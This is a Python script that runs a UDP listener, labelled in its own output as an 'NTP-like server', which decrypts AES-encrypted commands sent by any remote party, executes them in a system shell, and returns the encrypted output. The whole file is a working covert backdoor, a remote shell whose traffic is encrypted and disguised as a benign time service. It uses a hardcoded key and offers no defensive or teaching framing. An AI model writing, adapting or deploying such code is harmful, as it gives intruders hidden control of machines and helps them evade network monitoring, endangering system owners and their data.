import socket
import threading
import subprocess
import os
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

SECRET_KEY = b"MySuperSecretKey123456"

def encrypt_data(data):
    key = hashlib.sha256(SECRET_KEY).digest()
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(iv + encrypted).decode()

def decrypt_data(data):
    key = hashlib.sha256(SECRET_KEY).digest()
    raw_data = base64.b64decode(data)
    iv = raw_data[:16]
    encrypted = raw_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted), AES.block_size).decode()

server_ip = "0.0.0.0"
server_port = 12345

def handle_packet(data, address):
    try:
        decrypted_command = decrypt_data(data.decode("utf-8"))
        print(f"🔓 Decrypted command from {address}: {decrypted_command}")

        result = subprocess.run(decrypted_command, shell=True, text=True, capture_output=True)
        output = result.stdout + result.stderr

        if not output.strip():
            output = "(No output)"

    except Exception as e:
        output = f"Error executing command: {e}"

    response_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    chunk_size = 3800  # Ensure the response fits inside UDP packets
    for i in range(0, len(output), chunk_size):
        chunk = output[i:i + chunk_size]
        encrypted_chunk = encrypt_data(chunk)
        response_sock.sendto(encrypted_chunk.encode(), address)

    response_sock.sendto(encrypt_data("__END__").encode(), address)
    response_sock.close()

def start_udp_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((server_ip, server_port))
    print(f"🔐 Secure NTP-like server listening on {server_ip}:{server_port}")

    while True:
        data, address = sock.recvfrom(4096)
        threading.Thread(target=handle_packet, args=(data, address)).start()

start_udp_listener()
